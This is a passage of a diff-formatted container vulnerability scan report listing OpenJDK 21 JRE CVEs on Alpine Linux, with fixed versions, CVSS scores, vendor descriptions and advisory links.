+│                       │      │                   applications or sandboxed Java applets, that load and run
+│                       │      │                   untrusted code (e.g., code that comes from the internet) and
+│                       │      │                    rely on the Java sandbox for security. CVSS 3.1 Base Score
+│                       │      │                   7.5 (Integrity impacts).  CVSS Vector:
+│                       │      │                   (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N). 
+│                       │      ├ Severity        : HIGH 
+│                       │      ├ CweIDs           ─ [0]: CWE-284 
+│                       │      ├ VendorSeverity   ╭ alma       : 3 
+│                       │      │                  ├ oracle-oval: 3 
+│                       │      │                  ├ redhat     : 3 
+│                       │      │                  ╰ rocky      : 3 
+│                       │      ├ CVSS             ─ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H
+│                       │      │                           │           /A:N 
+│                       │      │                           ╰ V3Score : 7.5 
+│                       │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:42895 
+│                       │      │                  ├ [1] : https://access.redhat.com/security/cve/CVE-2026-47063 
+│                       │      │                  ├ [2] : https://bugzilla.redhat.com/2459420 
+│                       │      │                  ├ [3] : https://bugzilla.redhat.com/2502751 
+│                       │      │                  ├ [4] : https://bugzilla.redhat.com/2502782 
+│                       │      │                  ├ [5] : https://bugzilla.redhat.com/2502783 
+│                       │      │                  ├ [6] : https://bugzilla.redhat.com/2502784 
+│                       │      │                  ├ [7] : https://bugzilla.redhat.com/2502791 
+│                       │      │                  ├ [8] : https://bugzilla.redhat.com/2502792 
+│                       │      │                  ├ [9] : https://bugzilla.redhat.com/2502793 
+│                       │      │                  ├ [10]: https://bugzilla.redhat.com/2503636 
+│                       │      │                  ├ [11]: https://bugzilla.redhat.com/show_bug.cgi?id=2459420 
+│                       │      │                  ├ [12]: https://bugzilla.redhat.com/show_bug.cgi?id=2502751 
+│                       │      │                  ├ [13]: https://bugzilla.redhat.com/show_bug.cgi?id=2502782 
+│                       │      │                  ├ [14]: https://bugzilla.redhat.com/show_bug.cgi?id=2502783 
+│                       │      │                  ├ [15]: https://bugzilla.redhat.com/show_bug.cgi?id=2502784 
+│                       │      │                  ├ [16]: https://bugzilla.redhat.com/show_bug.cgi?id=2502791 
+│                       │      │                  ├ [17]: https://bugzilla.redhat.com/show_bug.cgi?id=2502792 
+│                       │      │                  ├ [18]: https://bugzilla.redhat.com/show_bug.cgi?id=2502793 
+│                       │      │                  ├ [19]: https://bugzilla.redhat.com/show_bug.cgi?id=2503636 
+│                       │      │                  ├ [20]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-41254 
+│                       │      │                  ├ [21]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-46917 
+│                       │      │                  ├ [22]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-46968 
+│                       │      │                  ├ [23]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-47010 
+│                       │      │                  ├ [24]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-47021 
+│                       │      │                  ├ [25]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-47027 
+│                       │      │                  ├ [26]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-47059 
+│                       │      │                  ├ [27]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-47063 
+│                       │      │                  ├ [28]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-60147 
+│                       │      │                  ├ [29]: https://errata.almalinux.org/10/ALSA-2026-42895.html 
+│                       │      │                  ├ [30]: https://errata.rockylinux.org/RLSA-2026:42899 
+│                       │      │                  ├ [31]: https://linux.oracle.com/cve/CVE-2026-47063.html 
+│                       │      │                  ├ [32]: https://linux.oracle.com/errata/ELSA-2026-42899.html 
+│                       │      │                  ├ [33]: https://nvd.nist.gov/vuln/detail/CVE-2026-47063 
+│                       │      │                  ├ [34]: https://www.cve.org/CVERecord?id=CVE-2026-47063 
+│                       │      │                  ╰ [35]: https://www.oracle.com/security-alerts/cpujul2026.html 
+│                       │      ├ PublishedDate   : 2026-07-21T22:17:12.19Z 
+│                       │      ╰ LastModifiedDate: 2026-08-03T18:50:40.373Z 
+│                       ├ [12] ╭ VulnerabilityID : CVE-2026-46917 
+│                       │      ├ PkgID           : openjdk21-jre-headless@21.0.11_p10-r0 
+│                       │      ├ PkgName         : openjdk21-jre-headless 
+│                       │      ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/openjdk21-jre-headless@21.0.11_p10-r0?
+│                       │      │                  │       arch=x86_64&distro=3.24.1 
+│                       │      │                  ╰ UID : e50dcf6a51ec8089 
+│                       │      ├ InstalledVersion: 21.0.11_p10-r0 
+│                       │      ├ FixedVersion    : 21.0.12_p8-r0 
+│                       │      ├ Status          : fixed 
+│                       │      ├ Layer            ╭ Digest: sha256:e75cbaefc0433d7c5850cec05a6c533ef54d45c19126
+│                       │      │                  │         4e4c9f62e347164a4006 
+│                       │      │                  ╰ DiffID: sha256:6fa3fec420de0c2f78798883e529d478f398e7489ffa
+│                       │      │                            77bbbb6e1ea62d15f4ee 
+│                       │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-46917 
+│                       │      ├ DataSource       ╭ ID  : alpine 
+│                       │      │                  ├ Name: Alpine Secdb 
+│                       │      │                  ╰ URL : https://secdb.alpinelinux.org/ 
+│                       │      ├ Fingerprint     : sha256:a57cd7956c2b74dcaaab458d7fb92da06ad0154eb069334692845
+│                       │      │                   46dba450a68 
+│                       │      ├ Title           : openjdk: OpenJDK: Improve DTLS handshaking (Oracle CPU
+│                       │      │                   2026-07) 
+│                       │      ├ Description     : Vulnerability in the Oracle Java SE, Oracle GraalVM for JDK,
+│                       │      │                    Oracle GraalVM Enterprise Edition product of Oracle Java SE
+│                       │      │                    (component: JSSE).  Supported versions that are affected
+│                       │      │                   are Oracle Java SE: 11.0.31, 17.0.19, 21.0.11, 25.0.3,
+│                       │      │                   26.0.1; Oracle GraalVM for JDK: 17.0.19 and  21.0.11; Oracle
+│                       │      │                    GraalVM Enterprise Edition: 21.3.18. Easily exploitable
+│                       │      │                   vulnerability allows unauthenticated attacker with network
+│                       │      │                   access via TLS to compromise Oracle Java SE, Oracle GraalVM
+│                       │      │                   for JDK, Oracle GraalVM Enterprise Edition.  Successful
+│                       │      │                   attacks of this vulnerability can result in unauthorized
+│                       │      │                   ability to cause a partial denial of service (partial DOS)
+│                       │      │                   of Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM
+│                       │      │                   Enterprise Edition. Note: This vulnerability can only be
+│                       │      │                   exploited by supplying data to APIs in the specified
+│                       │      │                   Component without using Untrusted Java Web Start
+│                       │      │                   applications or Untrusted Java applets, such as through a
+│                       │      │                   web service. CVSS 3.1 Base Score 5.3 (Availability impacts).
+│                       │      │                     CVSS Vector:
+│                       │      │                   (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L). 
+│                       │      ├ Severity        : MEDIUM 
+│                       │      ├ CweIDs           ─ [0]: CWE-284 
+│                       │      ├ VendorSeverity   ╭ alma       : 3 
+│                       │      │                  ├ oracle-oval: 3 
+│                       │      │                  ├ redhat     : 2 
+│                       │      │                  ╰ rocky      : 3 
+│                       │      ├ CVSS             ─ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N
+│                       │      │                           │           /A:L 
+│                       │      │                           ╰ V3Score : 5.3 
+│                       │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:42895 
+│                       │      │                  ├ [1] : https://access.redhat.com/security/cve/CVE-2026-46917 
+│                       │      │                  ├ [2] : https://bugzilla.redhat.com/2459420 
+│                       │      │                  ├ [3] : https://bugzilla.redhat.com/2502751 
+│                       │      │                  ├ [4] : https://bugzilla.redhat.com/2502782 
+│                       │      │                  ├ [5] : https://bugzilla.redhat.com/2502783 
+│                       │      │                  ├ [6] : https://bugzilla.redhat.com/2502784 
+│                       │      │                  ├ [7] : https://bugzilla.redhat.com/2502791 
+│                       │      │                  ├ [8] : https://bugzilla.redhat.com/2502792 
+│                       │      │                  ├ [9] : https://bugzilla.redhat.com/2502793 
+│                       │      │                  ├ [10]: https://bugzilla.redhat.com/2503636 
+│                       │      │                  ├ [11]: https://bugzilla.redhat.com/show_bug.cgi?id=2459420 
+│                       │      │                  ├ [12]: https://bugzilla.redhat.com/show_bug.cgi?id=2502751 
+│                       │      │                  ├ [13]: https://bugzilla.redhat.com/show_bug.cgi?id=2502782 
+│                       │      │                  ├ [14]: https://bugzilla.redhat.com/show_bug.cgi?id=2502783 
+│                       │      │                  ├ [15]: https://bugzilla.redhat.com/show_bug.cgi?id=2502784 
+│                       │      │                  ├ [16]: https://bugzilla.redhat.com/show_bug.cgi?id=2502791 
+│                       │      │                  ├ [17]: https://bugzilla.redhat.com/show_bug.cgi?id=2502792 
+│                       │      │                  ├ [18]: https://bugzilla.redhat.com/show_bug.cgi?id=2502793 
+│                       │      │                  ├ [19]: https://bugzilla.redhat.com/show_bug.cgi?id=2503636 
+│                       │      │                  ├ [20]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-41254 
+│                       │      │                  ├ [21]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-46917 
+│                       │      │                  ├ [22]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-46968 
+│                       │      │                  ├ [23]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-47010 
+│                       │      │                  ├ [24]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-47021 
+│                       │      │                  ├ [25]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-47027 
+│                       │      │                  ├ [26]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-47059 
+│                       │      │                  ├ [27]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-47063 
+│                       │      │                  ├ [28]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-60147 
+│                       │      │                  ├ [29]: https://errata.almalinux.org/10/ALSA-2026-42895.html 
+│                       │      │                  ├ [30]: https://errata.rockylinux.org/RLSA-2026:42899 
+│                       │      │                  ├ [31]: https://linux.oracle.com/cve/CVE-2026-46917.html 
+│                       │      │                  ├ [32]: https://linux.oracle.com/errata/ELSA-2026-42899.html 
+│                       │      │                  ├ [33]: https://nvd.nist.gov/vuln/detail/CVE-2026-46917 
+│                       │      │                  ├ [34]: https://www.cve.org/CVERecord?id=CVE-2026-46917 
+│                       │      │                  ╰ [35]: https://www.oracle.com/security-alerts/cpujul2026.html 
+│                       │      ├ PublishedDate   : 2026-07-21T22:17:01.81Z 
+│                       │      ╰ LastModifiedDate: 2026-08-03T18:55:54.35Z 
+│                       ├ [13] ╭ VulnerabilityID : CVE-2026-46968 
+│                       │      ├ PkgID           : openjdk21-jre-headless@21.0.11_p10-r0 
+│                       │      ├ PkgName         : openjdk21-jre-headless 
+│                       │      ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/openjdk21-jre-headless@21.0.11_p10-r0?
+│                       │      │                  │       arch=x86_64&distro=3.24.1 
+│                       │      │                  ╰ UID : e50dcf6a51ec8089 
+│                       │      ├ InstalledVersion: 21.0.11_p10-r0 
+│                       │      ├ FixedVersion    : 21.0.12_p8-r0 
+│                       │      ├ Status          : fixed 
+│                       │      ├ Layer            ╭ Digest: sha256:e75cbaefc0433d7c5850cec05a6c533ef54d45c19126
+│                       │      │                  │         4e4c9f62e347164a4006 
+│                       │      │                  ╰ DiffID: sha256:6fa3fec420de0c2f78798883e529d478f398e7489ffa
+│                       │      │                            77bbbb6e1ea62d15f4ee 
+│                       │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-46968 
+│                       │      ├ DataSource       ╭ ID  : alpine 
+│                       │      │                  ├ Name: Alpine Secdb 
+│                       │      │                  ╰ URL : https://secdb.alpinelinux.org/ 
+│                       │      ├ Fingerprint     : sha256:070035c5e7c1cff33e93f708b7863e84677866de4a06b022b0678
+│                       │      │                   67bff5e87c5 
+│                       │      ├ Title           : openjdk: Enhance TLS certificate handling 
+│                       │      ├ Description     : Vulnerability in Oracle Java SE (component: JSSE). 
+│                       │      │                   Supported versions that are affected are Oracle Java SE:
+│                       │      │                   8u491, 8u491-perf, 11.0.31, 17.0.19, 21.0.11, 25.0.3,
+│                       │      │                   26.0.1; Oracle GraalVM for JDK: 17.0.19 and  21.0.11; Oracle
+│                       │      │                    GraalVM Enterprise Edition: 21.3.18. Difficult to exploit
+│                       │      │                   vulnerability allows unauthenticated attacker with network
+│                       │      │                   access via TLS to compromise Oracle Java SE.  Successful
+│                       │      │                   attacks of this vulnerability can result in  unauthorized
+│                       │      │                   creation, deletion or modification access to critical data
+│                       │      │                   or all Oracle Java SE accessible data. Note: This
+│                       │      │                   vulnerability can only be exploited by supplying data to
+│                       │      │                   APIs in the specified Component without using Untrusted Java
+│                       │      │                    Web Start applications or Untrusted Java applets, such as
+│                       │      │                   through a web service. CVSS 3.1 Base Score 5.9 (Integrity
+│                       │      │                   impacts).  CVSS Vector:
+│                       │      │                   (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N). 
+│                       │      ├ Severity        : MEDIUM 
+│                       │      ├ CweIDs           ─ [0]: CWE-284 
+│                       │      ├ VendorSeverity   ╭ alma       : 3 
+│                       │      │                  ├ oracle-oval: 3 
+│                       │      │                  ├ redhat     : 2 
+│                       │      │                  ╰ rocky      : 3 
+│                       │      ├ CVSS             ─ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H
+│                       │      │                           │           /A:N 
+│                       │      │                           ╰ V3Score : 5.9 
+│                       │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:42895 
+│                       │      │                  ├ [1] : https://access.redhat.com/security/cve/CVE-2026-46968 
+│                       │      │                  ├ [2] : https://bugzilla.redhat.com/2459420 
+│                       │      │                  ├ [3] : https://bugzilla.redhat.com/2502751 
+│                       │      │                  ├ [4] : https://bugzilla.redhat.com/2502782 
+│                       │      │                  ├ [5] : https://bugzilla.redhat.com/2502783 
+│                       │      │                  ├ [6] : https://bugzilla.redhat.com/2502784 
+│                       │      │                  ├ [7] : https://bugzilla.redhat.com/2502791 
+│                       │      │                  ├ [8] : https://bugzilla.redhat.com/2502792 
+│                       │      │                  ├ [9] : https://bugzilla.redhat.com/2502793 
+│                       │      │                  ├ [10]: https://bugzilla.redhat.com/2503636 
+│                       │      │                  ├ [11]: https://bugzilla.redhat.com/show_bug.cgi?id=2459420 
+│                       │      │                  ├ [12]: https://bugzilla.redhat.com/show_bug.cgi?id=2502751 
+│                       │      │                  ├ [13]: https://bugzilla.redhat.com/show_bug.cgi?id=2502782 
+│                       │      │                  ├ [14]: https://bugzilla.redhat.com/show_bug.cgi?id=2502783 
+│                       │      │                  ├ [15]: https://bugzilla.redhat.com/show_bug.cgi?id=2502784 
+│                       │      │                  ├ [16]: https://bugzilla.redhat.com/show_bug.cgi?id=2502791 
+│                       │      │                  ├ [17]: https://bugzilla.redhat.com/show_bug.cgi?id=2502792 
+│                       │      │                  ├ [18]: https://bugzilla.redhat.com/show_bug.cgi?id=2502793 
+│                       │      │                  ├ [19]: https://bugzilla.redhat.com/show_bug.cgi?id=2503636 
+│                       │      │                  ├ [20]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-41254 
+│                       │      │                  ├ [21]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-46917 
+│                       │      │                  ├ [22]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-46968 
+│                       │      │                  ├ [23]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-47010 
+│                       │      │                  ├ [24]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-47021 
+│                       │      │                  ├ [25]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-47027 
+│                       │      │                  ├ [26]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-47059 
+│                       │      │                  ├ [27]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-47063 
+│                       │      │                  ├ [28]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-60147 
+│                       │      │                  ├ [29]: https://errata.almalinux.org/10/ALSA-2026-42895.html 
+│                       │      │                  ├ [30]: https://errata.rockylinux.org/RLSA-2026:42899 
+│                       │      │                  ├ [31]: https://linux.oracle.com/cve/CVE-2026-46968.html 
+│                       │      │                  ├ [32]: https://linux.oracle.com/errata/ELSA-2026-42899.html 
+│                       │      │                  ├ [33]: https://nvd.nist.gov/vuln/detail/CVE-2026-46968 
+│                       │      │                  ├ [34]: https://www.cve.org/CVERecord?id=CVE-2026-46968 
+│                       │      │                  ╰ [35]: https://www.oracle.com/security-alerts/cpujul2026.html 
+│                       │      ├ PublishedDate   : 2026-07-21T22:17:02.76Z 
+│                       │      ╰ LastModifiedDate: 2026-07-31T15:27:29.943Z 
+│                       ├ [14] ╭ VulnerabilityID : CVE-2026-47021 
+│                       │      ├ PkgID           : openjdk21-jre-headless@21.0.11_p10-r0 
+│                       │      ├ PkgName         : openjdk21-jre-headless 
+│                       │      ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/openjdk21-jre-headless@21.0.11_p10-r0?
+│                       │      │                  │       arch=x86_64&distro=3.24.1 
+│                       │      │                  ╰ UID : e50dcf6a51ec8089 
+│                       │      ├ InstalledVersion: 21.0.11_p10-r0 
+│                       │      ├ FixedVersion    : 21.0.12_p8-r0 
+│                       │      ├ Status          : fixed 
+│                       │      ├ Layer            ╭ Digest: sha256:e75cbaefc0433d7c5850cec05a6c533ef54d45c19126
+│                       │      │                  │         4e4c9f62e347164a4006 
+│                       │      │                  ╰ DiffID: sha256:6fa3fec420de0c2f78798883e529d478f398e7489ffa
+│                       │      │                            77bbbb6e1ea62d15f4ee 
+│                       │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-47021 
+│                       │      ├ DataSource       ╭ ID  : alpine 
+│                       │      │                  ├ Name: Alpine Secdb 
+│                       │      │                  ╰ URL : https://secdb.alpinelinux.org/ 
+│                       │      ├ Fingerprint     : sha256:7b9e993041f75fb4b5a80cc1a6849c30c007fd80058331073521f
+│                       │      │                   d9fb49e63c8 
+│                       │      ├ Title           : openjdk: OpenJDK: Enhance XBM image support (Oracle CPU
+│                       │      │                   2026-07) 
+│                       │      ├ Description     : Vulnerability in the Oracle Java SE, Oracle GraalVM for JDK,
+│                       │      │                    Oracle GraalVM Enterprise Edition product of Oracle Java SE
+│                       │      │                    (component: 2D).  Supported versions that are affected are
+│                       │      │                   Oracle Java SE: 8u491, 8u491-perf, 11.0.31, 17.0.19,
+│                       │      │                   21.0.11, 25.0.3, 26.0.1; Oracle GraalVM for JDK: 17.0.19 and
+│                       │      │                     21.0.11; Oracle GraalVM Enterprise Edition: 21.3.18.
+│                       │      │                   Easily exploitable vulnerability allows unauthenticated
+│                       │      │                   attacker with network access via multiple protocols to
+│                       │      │                   compromise Oracle Java SE, Oracle GraalVM for JDK, Oracle
+│                       │      │                   GraalVM Enterprise Edition.  Successful attacks of this
+│                       │      │                   vulnerability can result in unauthorized ability to cause a
+│                       │      │                   partial denial of service (partial DOS) of Oracle Java SE,
+│                       │      │                   Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition.
+│                       │      │                   Note: This vulnerability can be exploited by using APIs in
+│                       │      │                   the specified Component, e.g., through a web service which
+│                       │      │                   supplies data to the APIs. This vulnerability also applies
+│                       │      │                   to Java deployments, typically in clients running sandboxed
+│                       │      │                   Java Web Start applications or sandboxed Java applets, that
+│                       │      │                   load and run untrusted code (e.g., code that comes from the
+│                       │      │                   internet) and rely on the Java sandbox for security. CVSS
+│                       │      │                   3.1 Base Score 5.3 (Availability impacts).  CVSS Vector:
+│                       │      │                   (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L). 
+│                       │      ├ Severity        : MEDIUM 
+│                       │      ├ CweIDs           ─ [0]: CWE-400 
+│                       │      ├ VendorSeverity   ╭ alma       : 3 
+│                       │      │                  ├ oracle-oval: 3 
+│                       │      │                  ├ redhat     : 2 
+│                       │      │                  ╰ rocky      : 3 
+│                       │      ├ CVSS             ─ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N
+│                       │      │                           │           /A:L 
+│                       │      │                           ╰ V3Score : 5.3 
+│                       │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:42895 
+│                       │      │                  ├ [1] : https://access.redhat.com/security/cve/CVE-2026-47021 
+│                       │      │                  ├ [2] : https://bugzilla.redhat.com/2459420 
+│                       │      │                  ├ [3] : https://bugzilla.redhat.com/2502751 
+│                       │      │                  ├ [4] : https://bugzilla.redhat.com/2502782 
+│                       │      │                  ├ [5] : https://bugzilla.redhat.com/2502783 
+│                       │      │                  ├ [6] : https://bugzilla.redhat.com/2502784 
+│                       │      │                  ├ [7] : https://bugzilla.redhat.com/2502791 
+│                       │      │                  ├ [8] : https://bugzilla.redhat.com/2502792 
+│                       │      │                  ├ [9] : https://bugzilla.redhat.com/2502793 
+│                       │      │                  ├ [10]: https://bugzilla.redhat.com/2503636 
+│                       │      │                  ├ [11]: https://bugzilla.redhat.com/show_bug.cgi?id=2459420 
+│                       │      │                  ├ [12]: https://bugzilla.redhat.com/show_bug.cgi?id=2502751 
+│                       │      │                  ├ [13]: https://bugzilla.redhat.com/show_bug.cgi?id=2502782 
+│                       │      │                  ├ [14]: https://bugzilla.redhat.com/show_bug.cgi?id=2502783 
+│                       │      │                  ├ [15]: https://bugzilla.redhat.com/show_bug.cgi?id=2502784 
+│                       │      │                  ├ [16]: https://bugzilla.redhat.com/show_bug.cgi?id=2502791 
+│                       │      │                  ├ [17]: https://bugzilla.redhat.com/show_bug.cgi?id=2502792 
+│                       │      │                  ├ [18]: https://bugzilla.redhat.com/show_bug.cgi?id=2502793 
+│                       │      │                  ├ [19]: https://bugzilla.redhat.com/show_bug.cgi?id=2503636 
+│                       │      │                  ├ [20]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-41254 
+│                       │      │                  ├ [21]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-46917 
+│                       │      │                  ├ [22]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-46968 
+│                       │      │                  ├ [23]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-47010 
+│                       │      │                  ├ [24]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-47021 
+│                       │      │                  ├ [25]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-47027 
+│                       │      │                  ├ [26]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-47059 
+│                       │      │                  ├ [27]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-47063 
+│                       │      │                  ├ [28]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-60147 
+│                       │      │                  ├ [29]: https://errata.almalinux.org/10/ALSA-2026-42895.html 
+│                       │      │                  ├ [30]: https://errata.rockylinux.org/RLSA-2026:42899 
+│                       │      │                  ├ [31]: https://linux.oracle.com/cve/CVE-2026-47021.html 
+│                       │      │                  ├ [32]: https://linux.oracle.com/errata/ELSA-2026-42899.html 
+│                       │      │                  ├ [33]: https://nvd.nist.gov/vuln/detail/CVE-2026-47021 
+│                       │      │                  ├ [34]: https://www.cve.org/CVERecord?id=CVE-2026-47021 
+│                       │      │                  ╰ [35]: https://www.oracle.com/security-alerts/cpujul2026.html 
+│                       │      ├ PublishedDate   : 2026-07-21T22:17:07.67Z 
+│                       │      ╰ LastModifiedDate: 2026-07-31T13:42:33.4Z 
+│                       ├ [15] ╭ VulnerabilityID : CVE-2026-47027 
+│                       │      ├ PkgID           : openjdk21-jre-headless@21.0.11_p10-r0 
+│                       │      ├ PkgName         : openjdk21-jre-headless 
+│                       │      ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/openjdk21-jre-headless@21.0.11_p10-r0?
+│                       │      │                  │       arch=x86_64&distro=3.24.1 
+│                       │      │                  ╰ UID : e50dcf6a51ec8089 
+│                       │      ├ InstalledVersion: 21.0.11_p10-r0 
+│                       │      ├ FixedVersion    : 21.0.12_p8-r0 
+│                       │      ├ Status          : fixed 
+│                       │      ├ Layer            ╭ Digest: sha256:e75cbaefc0433d7c5850cec05a6c533ef54d45c19126
+│                       │      │                  │         4e4c9f62e347164a4006 
+│                       │      │                  ╰ DiffID: sha256:6fa3fec420de0c2f78798883e529d478f398e7489ffa
+│                       │      │                            77bbbb6e1ea62d15f4ee 
+│                       │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-47027 
+│                       │      ├ DataSource       ╭ ID  : alpine 
+│                       │      │                  ├ Name: Alpine Secdb 
+│                       │      │                  ╰ URL : https://secdb.alpinelinux.org/ 
+│                       │      ├ Fingerprint     : sha256:42472727a0ec35c040ff67ac8c99275cc0608f979af6ca65a0fa5
+│                       │      │                   1d457978f73 
+│                       │      ├ Title           : openjdk: OpenJDK: Enhance Jar file processing (Oracle CPU
+│                       │      │                   2026-07) 
+│                       │      ├ Description     : Vulnerability in Oracle Java SE (component: Libraries). 
+│                       │      │                   Supported versions that are affected are Oracle Java SE:
+│                       │      │                   8u491, 8u491-perf, 11.0.31, 17.0.19, 21.0.11, 25.0.3,
+│                       │      │                   26.0.1; Oracle GraalVM for JDK: 17.0.19 and  21.0.11; Oracle
+│                       │      │                    GraalVM Enterprise Edition: 21.3.18. Easily exploitable
+│                       │      │                   vulnerability allows unauthenticated attacker with network
+│                       │      │                   access via multiple protocols to compromise Oracle Java SE. 
+│                       │      │                    Successful attacks of this vulnerability can result in
+│                       │      │                   unauthorized ability to cause a partial denial of service
+│                       │      │                   (partial DOS) of Oracle Java SE. Note: This vulnerability
+│                       │      │                   can be exploited by using APIs in the specified Component,
+│                       │      │                   e.g., through a web service which supplies data to the APIs.
+│                       │      │                    This vulnerability also applies to Java deployments,
+│                       │      │                   typically in clients running sandboxed Java Web Start
+│                       │      │                   applications or sandboxed Java applets, that load and run
+│                       │      │                   untrusted code (e.g., code that comes from the internet) and
+│                       │      │                    rely on the Java sandbox for security. CVSS 3.1 Base Score
+│                       │      │                   5.3 (Availability impacts).  CVSS Vector:
+│                       │      │                   (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L). 
+│                       │      ├ Severity        : MEDIUM 
+│                       │      ├ CweIDs           ─ [0]: CWE-284 
+│                       │      ├ VendorSeverity   ╭ alma       : 3 
+│                       │      │                  ├ oracle-oval: 3 
+│                       │      │                  ├ redhat     : 2 
+│                       │      │                  ╰ rocky      : 3 
+│                       │      ├ CVSS             ─ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N
+│                       │      │                           │           /A:L 
+│                       │      │                           ╰ V3Score : 5.3 
+│                       │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:42895 
+│                       │      │                  ├ [1] : https://access.redhat.com/security/cve/CVE-2026-47027 
+│                       │      │                  ├ [2] : https://bugzilla.redhat.com/2459420 
+│                       │      │                  ├ [3] : https://bugzilla.redhat.com/2502751 
+│                       │      │                  ├ [4] : https://bugzilla.redhat.com/2502782 
+│                       │      │                  ├ [5] : https://bugzilla.redhat.com/2502783 
+│                       │      │                  ├ [6] : https://bugzilla.redhat.com/2502784 
+│                       │      │                  ├ [7] : https://bugzilla.redhat.com/2502791 
+│                       │      │                  ├ [8] : https://bugzilla.redhat.com/2502792 
+│                       │      │                  ├ [9] : https://bugzilla.redhat.com/2502793 
+│                       │      │                  ├ [10]: https://bugzilla.redhat.com/2503636 
+│                       │      │                  ├ [11]: https://bugzilla.redhat.com/show_bug.cgi?id=2459420 
+│                       │      │                  ├ [12]: https://bugzilla.redhat.com/show_bug.cgi?id=2502751 
+│                       │      │                  ├ [13]: https://bugzilla.redhat.com/show_bug.cgi?id=2502782 
+│                       │      │                  ├ [14]: https://bugzilla.redhat.com/show_bug.cgi?id=2502783 
+│                       │      │                  ├ [15]: https://bugzilla.redhat.com/show_bug.cgi?id=2502784 
+│                       │      │                  ├ [16]: https://bugzilla.redhat.com/show_bug.cgi?id=2502791 
+│                       │      │                  ├ [17]: https://bugzilla.redhat.com/show_bug.cgi?id=2502792 
+│                       │      │                  ├ [18]: https://bugzilla.redhat.com/show_bug.cgi?id=2502793 
+│                       │      │                  ├ [19]: https://bugzilla.redhat.com/show_bug.cgi?id=2503636 
